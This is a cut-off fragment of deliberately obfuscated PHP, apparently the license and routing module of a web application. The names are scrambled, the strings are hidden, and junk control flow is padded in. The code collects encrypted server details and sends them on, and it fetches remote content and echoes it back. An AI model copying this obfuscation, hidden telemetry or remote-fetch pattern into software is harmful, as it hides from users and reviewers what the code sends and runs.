$†Ú­ÑÃ¥ =& $_SERVER[ïëó©ÒÚ]; $»¶ñÀ¾ø =& $_SERVER[•×è•É]; $è½ûËêÅ = $»¶ñÀ¾ø[4]; $öé—Ä = $†Ú­ÑÃ¥[635]; $Œ¯è« = $GLOBALS[$»¶ñÀ¾ø[13]][$»¶ñÀ¾ø[14]][0]; $ÉÆıÓÑÔ = $†Ú­ÑÃ¥[636]; while ($ÉÆıÓÑÔ < $†Ú­ÑÃ¥[637]) { if ($ÉÆıÓÑÔ >= 0) { break; } $ÉÆıÓÑÔ++; } if (!$Œ¯è« || strlen($Œ¯è«) <= strlen($è½ûËêÅ)) { return; } if (strtolower(substr($Œ¯è«, -strlen($è½ûËêÅ))) != $è½ûËêÅ) { return; } $ğğÒªÄè = substr($Œ¯è«, 0, -strlen($è½ûËêÅ)); $ˆŒÓƒ“ = array($»¶ñÀ¾ø[4], $ğğÒªÄè); $¶áËì‚™ = array_slice($GLOBALS[$»¶ñÀ¾ø[13]][$»¶ñÀ¾ø[14]], 1); $GLOBALS[$»¶ñÀ¾ø[13]][$»¶ñÀ¾ø[14]] = array_merge($ˆŒÓƒ“, $¶áËì‚™); $º„şğº = $†Ú­ÑÃ¥[638]; if (strlen($º„şğº) < $†Ú­ÑÃ¥[631]) { die; } $GLOBALS[$»¶ñÀ¾ø[13]][$»¶ñÀ¾ø[15]] = implode($»¶ñÀ¾ø[0], $GLOBALS[$»¶ñÀ¾ø[13]][$»¶ñÀ¾ø[14]]); } private function azime065681b() { $¿Œüìæ… =& $_SERVER[ïëó©ÒÚ]; $ô·½Ç£¢ =& $_SERVER[•×è•É]; if ($GLOBALS[$ô·½Ç£¢[13]][$ô·½Ç£¢[15]] != $ô·½Ç£¢[6]) { return; } $â·«ÌƒÅ = $_SERVER[$ô·½Ç£¢[16]]; $Šæƒåõ = $¿Œüìæ…[639]; if (strlen($Šæƒåõ) < $¿Œüìæ…[405]) { die; } $ºñòã¤Ü = $ô·½Ç£¢[17]; $¾ôÕê¯™ = $¿Œüìæ…[640]; if (!strstr($â·«ÌƒÅ, $ºñòã¤Ü)) { return; } $Ùóî¢”× = strrpos($â·«ÌƒÅ, $ºñòã¤Ü); $ãä™„º‡ = $¿Œüìæ…[641]; $ïÕÔµ‘ = substr($â·«ÌƒÅ, $Ùóî¢”× + strlen($ºñòã¤Ü)); $èÌğ¤úµ = $¿Œüìæ…[642]; preg_match_all($ô·½Ç£¢[18], $ïÕÔµ‘, $Ø±‰ğÖˆ); $Ú»şŠ•§ = $¿Œüìæ…[643]; $ïÕÔµ‘ = trim($Ø±‰ğÖˆ[0][0], $ô·½Ç£¢[19]); $‰ÒƒêÈ³ = $¿Œüìæ…[644]; $GLOBALS[$ô·½Ç£¢[13]][$ô·½Ç£¢[14]] = explode($ô·½Ç£¢[19], $ïÕÔµ‘); $­âáÛº„ = $¿Œüìæ…[645]; while ($­âáÛº„ < $¿Œüìæ…[631]) { if ($­âáÛº„ >= 0) { break; } $­âáÛº„++; } $GLOBALS[$ô·½Ç£¢[13]][$ô·½Ç£¢[15]] = implode($ô·½Ç£¢[0], $GLOBALS[$ô·½Ç£¢[13]][$ô·½Ç£¢[14]]); } public function run() { $øïÖ„Í” =& $_SERVER[ïëó©ÒÚ]; $ä‰ûúñ° =& $_SERVER[•×è•É]; $this->azime065681b(); $this->cvpbfa8cf4ac(); $½ã•Ş×ü = $øïÖ„Í”[646]; if (strlen($½ã•Ş×ü) < $øïÖ„Í”[647]) { die; } $şè¶¥á‰ = $GLOBALS[$ä‰ûúñ°[13]][$ä‰ûúñ°[14]]; $¡›åÃ¿¬ = $øïÖ„Í”[648]; if (!$¡›åÃ¿¬) { die; } $÷…·‚ı = $GLOBALS[$ä‰ûúñ°[13]][$ä‰ûúñ°[15]]; $éïƒ¯¹õ = $øïÖ„Í”[649]; define($ä‰ûúñ°[20], isset($şè¶¥á‰[0]) && $şè¶¥á‰[0] ? $şè¶¥á‰[0] : $this->defaultModule); $Øå—ê“¾ = $øïÖ„Í”[650]; if (strlen($Øå—ê“¾) < $øïÖ„Í”[631]) { return; } define($ä‰ûúñ°[21], isset($şè¶¥á‰[1]) && $şè¶¥á‰[0] ? $şè¶¥á‰[1] : $this->defaultController); $ÔÚÄ–ïª = $øïÖ„Í”[651]; define($ä‰ûúñ°[22], isset($şè¶¥á‰[2]) && $şè¶¥á‰[0] ? $şè¶¥á‰[2] : $this->defaultAction); define($ä‰ûúñ°[23], MOD . $ä‰ûúñ°[0] . ST . $ä‰ûúñ°[0] . ACT); $_SERVER[$ä‰ûúñ°[24]] = strtolower(ACTION); $³¡¾ş±ù = $øïÖ„Í”[652]; if (!$³¡¾ş±ù) { die; } $this->autorun(); $¤ƒ«ê…— = $øïÖ„Í”[653]; if (count($şè¶¥á‰) >= 3) { $this->appRun($÷…·‚ı); } else { $this->appRun(ACTION); } } private $frmw3575c793 = array(); private $bmjue0289c42 = ''; public function tlqk301b82a3() { $¯ÏòÉ¿Ÿ =& $_SERVER[ïëó©ÒÚ]; $À®ÈÁÆ =& $_SERVER[•×è•É]; $this->nvpw423f8180(); $this->ekhq84a7df3b(); $´©Ï¥áä = $¯ÏòÉ¿Ÿ[654]; $this->miec6c180c98(); $«Õ„ãËß = $¯ÏòÉ¿Ÿ[655]; if (strlen($«Õ„ãËß) < $¯ÏòÉ¿Ÿ[637]) { die; } $this->fyte963bf2c7(); $•×µã–¦ = $¯ÏòÉ¿Ÿ[656]; if (!$•×µã–¦) { return; } $this->thncbeb4adfb(); $Ï´šŒ˜Ö = $¯ÏòÉ¿Ÿ[657]; if (strlen($Ï´šŒ˜Ö) < $¯ÏòÉ¿Ÿ[405]) { return; } $this->kndsc9537954(); $this->lwkr76f3f9de(); $this->nxcm006ff05c($À®ÈÁÆ[25], array($this, $À®ÈÁÆ[26])); $this->nxcm006ff05c($À®ÈÁÆ[27], array($this, $À®ÈÁÆ[28])); $this->nxcm006ff05c($À®ÈÁÆ[29], array($this, $À®ÈÁÆ[30])); $æÄĞÊÂ» = $¯ÏòÉ¿Ÿ[658]; if (strlen($æÄĞÊÂ») < $¯ÏòÉ¿Ÿ[631]) { return; } $this->nxcm006ff05c($À®ÈÁÆ[31], array($this, $À®ÈÁÆ[32])); $…“’éÒ­ = $¯ÏòÉ¿Ÿ[659]; while (strlen($…“’éÒ­) < $¯ÏòÉ¿Ÿ[647]) { if (!$…“’éÒ­) { break; } $…“’éÒ­++; } } public function nderba27a0bd($ò—ƒ—õ¯) { $†Æ „€Æ =& $_SERVER[ïëó©ÒÚ]; $ÑÇÅ³¿ =& $_SERVER[•×è•É]; $×ÓÌşª = Model($ÑÇÅ³¿[33])->get(); $‹º­Ğ = array($ÑÇÅ³¿[34], $ÑÇÅ³¿[35], $ÑÇÅ³¿[36], $ÑÇÅ³¿[37], $ÑÇÅ³¿[38], $ÑÇÅ³¿[39], $ÑÇÅ³¿[40], $ÑÇÅ³¿[41], $ÑÇÅ³¿[42], $ÑÇÅ³¿[43], $ÑÇÅ³¿[44], $ÑÇÅ³¿[45], $ÑÇÅ³¿[46], $ÑÇÅ³¿[47], $ÑÇÅ³¿[48], $ÑÇÅ³¿[49], $ÑÇÅ³¿[50], $ÑÇÅ³¿[51], $ÑÇÅ³¿[52], $ÑÇÅ³¿[53], $ÑÇÅ³¿[54], $ÑÇÅ³¿[55], $ÑÇÅ³¿[56], $ÑÇÅ³¿[57], $ÑÇÅ³¿[58], $ÑÇÅ³¿[59], $ÑÇÅ³¿[60], $ÑÇÅ³¿[61], $ÑÇÅ³¿[62], $ÑÇÅ³¿[63], $ÑÇÅ³¿[64], $ÑÇÅ³¿[65], $ÑÇÅ³¿[66], $ÑÇÅ³¿[67], $ÑÇÅ³¿[68], $ÑÇÅ³¿[69], $ÑÇÅ³¿[70], $ÑÇÅ³¿[71], $ÑÇÅ³¿[72], $ÑÇÅ³¿[73], $ÑÇÅ³¿[74], $ÑÇÅ³¿[75], $ÑÇÅ³¿[76], $ÑÇÅ³¿[77], $ÑÇÅ³¿[78], $ÑÇÅ³¿[79], $ÑÇÅ³¿[80], $ÑÇÅ³¿[81], $ÑÇÅ³¿[82], $ÑÇÅ³¿[83]); foreach ($‹º­Ğ as $¦ºÂºŠÙ) { $ñÁ‚È½ = $GLOBALS[$ÑÇÅ³¿[84]][$ÑÇÅ³¿[85]][$¦ºÂºŠÙ]; if (isset($×ÓÌşª[$¦ºÂºŠÙ])) { $ñÁ‚È½ = $×ÓÌşª[$¦ºÂºŠÙ]; } $ò—ƒ—õ¯[$ÑÇÅ³¿[86]][$ÑÇÅ³¿[87]][$¦ºÂºŠÙ] = $ñÁ‚È½; } $ºòªØşî = $ò—ƒ—õ¯[$ÑÇÅ³¿[86]][$ÑÇÅ³¿[87]][$ÑÇÅ³¿[46]]; unset($ò—ƒ—õ¯[$ÑÇÅ³¿[86]][$ÑÇÅ³¿[88]][$ÑÇÅ³¿[89]]); unset($ò—ƒ—õ¯[$ÑÇÅ³¿[86]][$ÑÇÅ³¿[88]][$ÑÇÅ³¿[90]]); unset($ò—ƒ—õ¯[$ÑÇÅ³¿[86]][$ÑÇÅ³¿[87]][$ÑÇÅ³¿[46]]); unset($ò—ƒ—õ¯[$ÑÇÅ³¿[86]][$ÑÇÅ³¿[87]][$ÑÇÅ³¿[91]]); $ò—ƒ—õ¯[$ÑÇÅ³¿[86]][$ÑÇÅ³¿[87]][$ÑÇÅ³¿[92]] = array($ÑÇÅ³¿[93] => (int) $ºòªØşî[$ÑÇÅ³¿[94]], $ÑÇÅ³¿[95] => (int) _get($ºòªØşî, $ÑÇÅ³¿[96], 0)); $ò—ƒ—õ¯[$ÑÇÅ³¿[97]][$ÑÇÅ³¿[98]] = Action($ÑÇÅ³¿[99])->accessToken(); $îüü¥í¼ = $†Æ „€Æ[660]; if (!$îüü¥í¼) { return; } $ò—ƒ—õ¯[$ÑÇÅ³¿[97]][$ÑÇÅ³¿[100]] = md5($_SERVER[$ÑÇÅ³¿[101]] . $×ÓÌşª[$ÑÇÅ³¿[102]]); $ò—ƒ—õ¯[$ÑÇÅ³¿[97]][$ÑÇÅ³¿[103]] = base64_encode(serverInfo()); $ò—ƒ—õ¯[$ÑÇÅ³¿[97]][$ÑÇÅ³¿[104]] = $this->bmjue0289c42; $‚¨ÕòŸÌ = $†Æ „€Æ[661]; if ($×ÓÌşª[$ÑÇÅ³¿[104]] != $ÑÇÅ³¿[105]) { $ò—ƒ—õ¯[$ÑÇÅ³¿[97]][$ÑÇÅ³¿[106]] = $×ÓÌşª[$ÑÇÅ³¿[106]]; $ò—ƒ—õ¯[$ÑÇÅ³¿[97]][$ÑÇÅ³¿[107]] = $×ÓÌşª[$ÑÇÅ³¿[107]]; $¯è£ı­‰ = rand_string(10) . $this->bmjue0289c42 . rand_string(5); $ò—ƒ—õ¯[$ÑÇÅ³¿[86]][$ÑÇÅ³¿[108]][$ÑÇÅ³¿[109]] = $this->otdb0fabe9d9($¯è£ı­‰, $ò—ƒ—õ¯[$ÑÇÅ³¿[97]][$ÑÇÅ³¿[100]]); } if ($this->bmjue0289c42 == $ÑÇÅ³¿[105]) { $ò—ƒ—õ¯[$ÑÇÅ³¿[86]][$ÑÇÅ³¿[87]][$ÑÇÅ³¿[92]][$ÑÇÅ³¿[96]] = 0; } $ò—ƒ—õ¯[$ÑÇÅ³¿[97]][$ÑÇÅ³¿[110]] = _get($this->frmw3575c793, $ÑÇÅ³¿[111], $ÑÇÅ³¿[6]); $ò—ƒ—õ¯[$ÑÇÅ³¿[97]][$ÑÇÅ³¿[112]] = _get($this->frmw3575c793, $ÑÇÅ³¿[113], $ÑÇÅ³¿[6]); $Õª¨üİ = $†Æ „€Æ[662]; while (strlen($Õª¨üİ) < $†Æ „€Æ[637]) { if (!$Õª¨üİ) { break; } $Õª¨üİ++; } if (_get($GLOBALS, $ÑÇÅ³¿[114]) && $this->config[$ÑÇÅ³¿[115]]) { $ò—ƒ—õ¯[$ÑÇÅ³¿[97]][$ÑÇÅ³¿[116]] = WEB_ROOT; } return $ò—ƒ—õ¯; } private function kndsc9537954() { $¾Ôù¯à =& $_SERVER[ïëó©ÒÚ]; $ù—úëâ =& $_SERVER[•×è•É]; $İÒ€é·¸ = $_SERVER[$ù—úëâ[24]] == $ù—úëâ[117]; if ($_SERVER[$ù—úëâ[24]] == $ù—úëâ[118] && $_GET[$ù—úëâ[119]] == $ù—úëâ[120]) { $İÒ€é·¸ = !0; } if ($İÒ€é·¸) { $ƒ§ËÜ÷ = array($ù—úëâ[104] => $this->bmjue0289c42, $ù—úëâ[121] => $this->srih605e8481(), $ù—úëâ[122] => Model($ù—úëâ[123])->count()); if ($this->bmjue0289c42 != $ù—úëâ[105]) { $ìÍİ‹İó = _get($this->frmw3575c793, $ù—úëâ[124]); if ($ìÍİ‹İó) { $ƒ§ËÜ÷[$ù—úëâ[125]] = $ìÍİ‹İó; $ƒ§ËÜ÷[$ù—úëâ[126]] = strtotime(_get($this->frmw3575c793, $ù—úëâ[127])); $ƒ§ËÜ÷[$ù—úëâ[128]] = _get($this->frmw3575c793, $ù—úëâ[113]); } $²­üÇÁâ = Model($ù—úëâ[33])->get($ù—úëâ[129], $ù—úëâ[6], !0); if (is_string($²­üÇÁâ) && substr($²­üÇÁâ, 0, 1) == $ù—úëâ[130]) { $²­üÇÁâ = json_decode_force($²­üÇÁâ); } if (is_array($²­üÇÁâ) && $²­üÇÁâ[$ù—úëâ[131]] && strstr($²­üÇÁâ[$ù—úëâ[131]], $ù—úëâ[132])) { $û‡›Î‡¬ = explode($ù—úëâ[132], $²­üÇÁâ[$ù—úëâ[131]]); $ƒ§ËÜ÷[$ù—úëâ[133]] = $û‡›Î‡¬[0]; } } $ƒ§ËÜ÷ = $this->ikcn1a8e0d67(json_encode($ƒ§ËÜ÷), md5($ù—úëâ[134])); $éô×Ñ¡ƒ = array($ù—úëâ[135] => $ƒ§ËÜ÷); $Šò¸‘Ë = $¾Ôù¯à[663]; if (!$Šò¸‘Ë) { return; } call_user_func(array($ù—úëâ[136], $ù—úëâ[137]), $éô×Ñ¡ƒ); } if ($this->bmjue0289c42 == $ù—úëâ[105]) { return; } $Ìö¥¸¶Œ = array($ù—úëâ[138], $ù—úëâ[139], $ù—úëâ[140], $ù—úëâ[141], $ù—úëâ[142], $ù—úëâ[143]); $êóä’Á = $¾Ôù¯à[664]; while ($êóä’Á < $¾Ôù¯à[637]) { if ($êóä’Á >= 0) { break; } $êóä’Á++; } $‘›…¯Æ³ = Model($ù—úëâ[33])->get(); $éô×Ñ¡ƒ = array($ù—úëâ[144] => $‘›…¯Æ³[$ù—úëâ[34]], $ù—úëâ[145] => $‘›…¯Æ³[$ù—úëâ[35]], $ù—úëâ[146] => $ù—úëâ[6]); foreach ($Ìö¥¸¶Œ as $ôƒ­†éÆ) { if (!isset($‘›…¯Æ³[$ôƒ­†éÆ]) || !$‘›…¯Æ³[$ôƒ­†éÆ]) { continue; } $éô×Ñ¡ƒ[$ôƒ­†éÆ] = $‘›…¯Æ³[$ôƒ­†éÆ]; } call_user_func(array($ù—úëâ[136], $ù—úëâ[137]), $éô×Ñ¡ƒ); $èû‰—¬ß = $¾Ôù¯à[665]; if (strlen($èû‰—¬ß) < $¾Ôù¯à[647]) { die; } } private function fyte963bf2c7() { $ñ¸ŒêëÏ =& $_SERVER[ïëó©ÒÚ]; $áîÚ¼¤é =& $_SERVER[•×è•É]; if ($_SERVER[$áîÚ¼¤é[24]] != $áîÚ¼¤é[147]) { return; } if (!_get($GLOBALS, $áîÚ¼¤é[114])) { die; } $‰åû‚š½ = $GLOBALS[$áîÚ¼¤é[13]]; if (isset($‰åû‚š½[$áîÚ¼¤é[148]])) { $this->sagd66b5ca68(); die; } if (!isset($‰åû‚š½[$áîÚ¼¤é[149]]) || strlen($‰åû‚š½[$áîÚ¼¤é[149]]) != 16) { show_json($áîÚ¼¤é[150] . $‰åû‚š½[$áîÚ¼¤é[149]], !1); } $êŠï˜Óª = Model($áîÚ¼¤é[33])->get($áîÚ¼¤é[102]); $ÉÜ€©üö = md5($_SERVER[$áîÚ¼¤é[101]] . $êŠï˜Óª); $áµ°ı¹ = $ñ¸ŒêëÏ[666]; if (strlen($áµ°ı¹) < $ñ¸ŒêëÏ[637]) { die; } $¹Úº°•ñ = array($áîÚ¼¤é[149] => $‰åû‚š½[$áîÚ¼¤é[149]], $áîÚ¼¤é[151] => rand_string(16), $áîÚ¼¤é[152] => $áîÚ¼¤é[134], $áîÚ¼¤é[153] => $áîÚ¼¤é[154], $áîÚ¼¤é[155] => $_SERVER[$áîÚ¼¤é[156]], $áîÚ¼¤é[157] => $_SERVER[$áîÚ¼¤é[158]], $áîÚ¼¤é[159] => $_SERVER[$áîÚ¼¤é[160]], $áîÚ¼¤é[100] => $ÉÜ€©üö, $áîÚ¼¤é[161] => Model($áîÚ¼¤é[33])->get($áîÚ¼¤é[129])); if ($‰åû‚š½[$áîÚ¼¤é[162]] == $áîÚ¼¤é[163]) { $›ºÕîÃ¦ = $this->ikcn1a8e0d67($ÉÜ€©üö, $áîÚ¼¤é[164]); $Æûøë = $this->otdb0fabe9d9(json_encode($¹Úº°•ñ), $ÉÜ€©üö . $áîÚ¼¤é[165], 3); $Æûøë = $Æûøë . $áîÚ¼¤é[166] . $_SERVER[$áîÚ¼¤é[156]]; $À¯ƒĞÂ€ = $this->dckf90e0ad11($áîÚ¼¤é[167] . $›ºÕîÃ¦ . $áîÚ¼¤é[168] . $Æûøë, -1); show_json($À¯ƒĞÂ€, !0); } else { if ($‰åû‚š½[$áîÚ¼¤é[162]] == $áîÚ¼¤é[169]) { $†ÜÍïø› = substr(md5($áîÚ¼¤é[170] . $ÉÜ€©üö), 12, 15) . $áîÚ¼¤é[171]; $Æûøë = $this->zkdg817cabd1(trim($‰åû‚š½[$áîÚ¼¤é[172]]), $†ÜÍïø›, 2); $ÃÙ Ç¢€ = json_decode($Æûøë, !0); if (!is_array($ÃÙ Ç¢€) || !is_array($ÃÙ Ç¢€[$áîÚ¼¤é[173]]) || $ÃÙ Ç¢€[$áîÚ¼¤é[149]] != !0) { $Ó€ğ„Ò˜ = $áîÚ¼¤é[174]; $¿»»ø°º = $ÃÙ Ç¢€[$áîÚ¼¤é[173]] ? $áîÚ¼¤é[175] . $ÃÙ Ç¢€[$áîÚ¼¤é[173]] : $Ó€ğ„Ò˜; show_json($¿»»ø°º, !1); } else { $¹Úº°•ñ[$áîÚ¼¤é[151]] = $ÃÙ Ç¢€[$áîÚ¼¤é[173]][$áîÚ¼¤é[176]]; } } else { $ÃÙ Ç¢€ = $this->dckf90e0ad11($áîÚ¼¤é[177], $¹Úº°•ñ, 10); $ŸĞğ†ç  = $ñ¸ŒêëÏ[667]; } } if (!is_array($ÃÙ Ç¢€) || !is_array($ÃÙ Ç¢€[$áîÚ¼¤é[173]]) || $ÃÙ Ç¢€[$áîÚ¼¤é[149]] != !0) { $Ó€ğ„Ò˜ = LNG($áîÚ¼¤é[178]); $¿»»ø°º = $ÃÙ Ç¢€[$áîÚ¼¤é[173]] ? $áîÚ¼¤é[175] . $ÃÙ Ç¢€[$áîÚ¼¤é[173]] : $Ó€ğ„Ò˜; show_json($¿»»ø°º, !1); } $Â¬ı³ = $ÃÙ Ç¢€[$áîÚ¼¤é[173]]; $¥„²€¨ê = $this->mcog8531cda9($Â¬ı³[$áîÚ¼¤é[179]]); if (!$¥„²€¨ê || $¥„²€¨ê != $Â¬ı³[$áîÚ¼¤é[127]]) { $°œšú’´ = array($áîÚ¼¤é[180] => Model($áîÚ¼¤é[33])->get($áîÚ¼¤é[102]), $áîÚ¼¤é[181] => $_SERVER[$áîÚ¼¤é[101]], $áîÚ¼¤é[182] => this_url(), $áîÚ¼¤é[157] => $_SERVER[$áîÚ¼¤é[158]]); $Æûøë = $this->jfpm9291f5ef(json_encode($°œšú’´)); $this->dckf90e0ad11($áîÚ¼¤é[183] . $Æûøë); show_json(LNG($áîÚ¼¤é[184]), !0); } $Ì¢ÔÎÃÅ = array($áîÚ¼¤é[185] => $Â¬ı³[$áîÚ¼¤é[186]], $áîÚ¼¤é[187] => $Â¬ı³[$áîÚ¼¤é[188]], $áîÚ¼¤é[189] => rand_string(16), $áîÚ¼¤é[104] => $Â¬ı³[$áîÚ¼¤é[190]]); if ($¹Úº°•ñ[$áîÚ¼¤é[151]]) { $Ì¢ÔÎÃÅ[$áîÚ¼¤é[189]] = $¹Úº°•ñ[$áîÚ¼¤é[151]]; } $ôù”ÎØ = substr(md5($Ì¢ÔÎÃÅ[$áîÚ¼¤é[187]]), 10, 10); $ªóàº¿ = $ôù”ÎØ . $Ì¢ÔÎÃÅ[$áîÚ¼¤é[104]] . $Ì¢ÔÎÃÅ[$áîÚ¼¤é[189]]; $Ì¢ÔÎÃÅ[$áîÚ¼¤é[106]] = strrev(base64_encode($this->ikcn1a8e0d67($ªóàº¿, $áîÚ¼¤é[191]))); $®€£€–œ = rand_string(16); $­Îƒâû½ = $®€£€–œ . $Ì¢ÔÎÃÅ[$áîÚ¼¤é[104]] . $this->ikcn1a8e0d67(md5($Ì¢ÔÎÃÅ[$áîÚ¼¤é[185]]), $®€£€–œ); $Ì¢ÔÎÃÅ[$áîÚ¼¤é[107]] = base64_encode(strrev($this->ikcn1a8e0d67($­Îƒâû½, $áîÚ¼¤é[192]))); if ($Â¬ı³[$áîÚ¼¤é[193]] && $Â¬ı³[$áîÚ¼¤é[193]] >= 1) { Model($áîÚ¼¤é[33])->setDeep($áîÚ¼¤é[194], $áîÚ¼¤é[120]); } Model($áîÚ¼¤é[33])->set($Ì¢ÔÎÃÅ); $ñ‚¡›…£ = md5($_SERVER[$áîÚ¼¤é[101]] . strrev($êŠï˜Óª) . $Ì¢ÔÎÃÅ[$áîÚ¼¤é[187]]); $ö›ì±åì = strrev(substr($ñ‚¡›…£, 10, 16)); $‰®‘‹¶ì = $this->otdb0fabe9d9(json_encode($Â¬ı³), $ñ‚¡›…£); $ö“©àå¸ = $ñ¸ŒêëÏ[668]; if (!$ö“©àå¸) { die; } $˜‚şËŠù = array_to_keyvalue(Model($áîÚ¼¤é[7])->listData(), $áîÚ¼¤é[195]); $²Ğ•ÍÕ = $˜‚şËŠù[$áîÚ¼¤é[196]]; $Óçïİ×‡ = array(); $Óçïİ×‡[$ö›ì±åì] = $‰®‘‹¶ì; Model($áîÚ¼¤é[7])->update($²Ğ•ÍÕ[$áîÚ¼¤é[197]], array($áîÚ¼¤é[198] => $Óçïİ×‡)); $ŸÚ†íö = $ñ¸ŒêëÏ[669]; while ($ŸÚ†íö < $ñ¸ŒêëÏ[631]) { if ($ŸÚ†íö >= 0) { break; } $ŸÚ†íö++; } $this->frmw3575c793 = $Â¬ı³; $this->bmjue0289c42 = $Ì¢ÔÎÃÅ[$áîÚ¼¤é[104]]; $€ÅÅÀ­ì = $ñ¸ŒêëÏ[670]; if (!$€ÅÅÀ­ì) { die; } $this->licenseRegistSuccess(); $‡ÅğõŒ¯ = $ñ¸ŒêëÏ[671]; while ($‡ÅğõŒ¯ < $ñ¸ŒêëÏ[628]) { if ($‡ÅğõŒ¯ >= 0) { break; } $‡ÅğõŒ¯++; } Cache::set($áîÚ¼¤é[199] . md5($êŠï˜Óª . $áîÚ¼¤é[200]), $áîÚ¼¤é[6]); $Æ”üô‹Ê = $ñ¸ŒêëÏ[672]; if (!$Æ”üô‹Ê) { die; } show_json(LNG($áîÚ¼¤é[184]), !0); } private function licenseRegistSuccess() { $šØŸÂŒ =& $_SERVER[•×è•É]; $ØÛ£ğ˜ = Model($šØŸÂŒ[33])->get(); if ($ØÛ£ğ˜[$šØŸÂŒ[63]] != $šØŸÂŒ[120]) { Model($šØŸÂŒ[33])->set($šØŸÂŒ[63], $šØŸÂŒ[120]); } Action($šØŸÂŒ[201])->initStart(!0); } private function sagd66b5ca68() { $‚Éµî¦™ =& $_SERVER[ïëó©ÒÚ]; $ãİ¬‹äŸ =& $_SERVER[•×è•É]; Model($ãİ¬‹äŸ[33])->set(array($ãİ¬‹äŸ[185] => $ãİ¬‹äŸ[6], $ãİ¬‹äŸ[187] => $ãİ¬‹äŸ[6], $ãİ¬‹äŸ[104] => $ãİ¬‹äŸ[105], $ãİ¬‹äŸ[106] => $ãİ¬‹äŸ[6], $ãİ¬‹äŸ[107] => $ãİ¬‹äŸ[6])); $À¡”öú = $‚Éµî¦™[673]; Model($ãİ¬‹äŸ[33])->setDeep($ãİ¬‹äŸ[194], $ãİ¬‹äŸ[202]); $”É½Üö° = $‚Éµî¦™[674]; $this->frmw3575c793 = array(); $this->bmjue0289c42 = $ãİ¬‹äŸ[105]; } private function nvpw423f8180() { $ÆºÉÖ =& $_SERVER[ïëó©ÒÚ]; $“åÇŠúê =& $_SERVER[•×è•É]; $_SERVER[$“åÇŠúê[158]] = _get($_SERVER, $“åÇŠúê[158], APP_HOST); $this->bmjue0289c42 = $“åÇŠúê[105]; $ ¾¥¼¬ƒ = $ÆºÉÖ[675]; while ($ ¾¥¼¬ƒ < $ÆºÉÖ[631]) { if ($ ¾¥¼¬ƒ >= 0) { break; } $ ¾¥¼¬ƒ++; } $¡…Ü–ßŞ = Model($“åÇŠúê[33])->get(); $·«Ü’¬É = $ÆºÉÖ[676]; if (!$·«Ü’¬É) { die; } if ($¡…Ü–ßŞ[$“åÇŠúê[104]] == $“åÇŠúê[105]) { return; } $ğ¼íıü = Model($“åÇŠúê[33])->get($“åÇŠúê[102]); $‡ú­øõÊ = $ÆºÉÖ[677]; while ($‡ú­øõÊ < $ÆºÉÖ[637]) { if ($‡ú­øõÊ >= 0) { break; } $‡ú­øõÊ++; } $Ì™’Â¸» = $“åÇŠúê[199] . md5($ğ¼íıü . $“åÇŠúê[200]); $‰ÎÓºí = $ÆºÉÖ[678]; if (strlen($‰ÎÓºí) < $ÆºÉÖ[631]) { return; } $µ¿çø°‰ = Cache::get($Ì™’Â¸»); if (!is_array($µ¿çø°‰) || !isset($µ¿çø°‰[$“åÇŠúê[203]]) || time() - $µ¿çø°‰[$“åÇŠúê[203]] >= 60) { $‰Ğ¢Ëü› = Model($“åÇŠúê[7])->loadList(); $Ê¨ÀÄï = $‰Ğ¢Ëü›[$“åÇŠúê[196]]; $Ÿù¬Ç¨ù = md5($_SERVER[$“åÇŠúê[101]] . strrev($ğ¼íıü) . $¡…Ü–ßŞ[$“åÇŠúê[187]]); $åûõı = strrev(substr($Ÿù¬Ç¨ù, 10, 16)); $µ¿çø°‰ = $this->zkdg817cabd1($Ê¨ÀÄï[$“åÇŠúê[84]][$åûõı], $Ÿù¬Ç¨ù); $µ¿çø°‰ = json_decode($µ¿çø°‰, !0); } if (!is_array($µ¿çø°‰)) { return $this->sagd66b5ca68(); } $Ü¯ÌÆ»º = strtotime($µ¿çø°‰[$“åÇŠúê[127]]); if (time() >= $Ü¯ÌÆ»º) { return $this->sagd66b5ca68(); } if (time() - $µ¿çø°‰[$“åÇŠúê[203]] > 20) { $µ¿çø°‰[$“åÇŠúê[203]] = time(); Cache::set($Ì™’Â¸», $µ¿çø°‰); } $this->frmw3575c793 = $µ¿çø°‰; $this->bmjue0289c42 = $¡…Ü–ßŞ[$“åÇŠúê[104]]; $çŒüÓ›Â = $ÆºÉÖ[679]; } private function ekhq84a7df3b() { $Ğã‘’øã =& $_SERVER[ïëó©ÒÚ]; $òÇƒÊõ =& $_SERVER[•×è•É]; $¥Ñç˜ñÖ = $GLOBALS[$òÇƒÊõ[13]]; $÷ÃË¯şÜ = $Ğã‘’øã[680]; if (strlen($÷ÃË¯şÜ) < $Ğã‘’øã[637]) { die; } $É™øÜè´ = $_SERVER[$òÇƒÊõ[24]]; $¿ù¥ÖÉ = $Ğã‘’øã[681]; if ($É™øÜè´ == $òÇƒÊõ[204] && $this->bmjue0289c42 == $òÇƒÊõ[105]) { show_json(LNG($òÇƒÊõ[205]), !1, $òÇƒÊõ[206]); } $İ¨‰ª = array($òÇƒÊõ[207], $òÇƒÊõ[208]); if (in_array($É™øÜè´, $İ¨‰ª)) { if ($this->bmjue0289c42 == $òÇƒÊõ[105] && isset($¥Ñç˜ñÖ[$òÇƒÊõ[209]])) { show_json(LNG($òÇƒÊõ[205]), !1, $òÇƒÊõ[206]); die; } $ÊØïˆì = $this->srih605e8481(); if ($ÊØïˆì != intval($òÇƒÊõ[210])) { if ($ÊØïˆì <= Model($òÇƒÊõ[123])->count()) { show_json(LNG($òÇƒÊõ[211]), !1, $òÇƒÊõ[206]); die; } } } } private function miec6c180c98() { $ÆÊº¤É =& $_SERVER[ïëó©ÒÚ]; $Ğ³ßæúß =& $_SERVER[•×è•É]; $ë©à–Ø = array($Ğ³ßæúß[117], $Ğ³ßæúß[118]); if (!_get($GLOBALS, $Ğ³ßæúß[114]) || !isset($_GET[$Ğ³ßæúß[212]])) { return; } if (!in_array($_SERVER[$Ğ³ßæúß[24]], $ë©à–Ø)) { return; } $‚Éµâ¦Î = $Ğ³ßæúß[213]; $‚Éµâ¦Î = $this->rjit7315a89e($‚Éµâ¦Î, $Ğ³ßæúß[214]); $°ã‚Îç¸ = stream_context_create(array($Ğ³ßæúß[215] => array($Ğ³ßæúß[216] => $Ğ³ßæúß[217], $Ğ³ßæúß[218] => 3))); $·ß®‹ûã = @file_get_contents($‚Éµâ¦Î, !1, $°ã‚Îç¸); $ÃÊÕ•ì¸ = $ÆÊº¤É[682]; header($Ğ³ßæúß[219]); $·ÃÜ©æ = $ÆÊº¤É[683]; if (!$·ÃÜ©æ) { die; } if ($·ß®‹ûã && strstr($·ß®‹ûã, $Ğ³ßæúß[220])) { echo $·ß®‹ûã; } die; } public function aigo867a3a9a($Ğâ®ŠÏ¼) { $ƒ³ˆİ¿ô =& 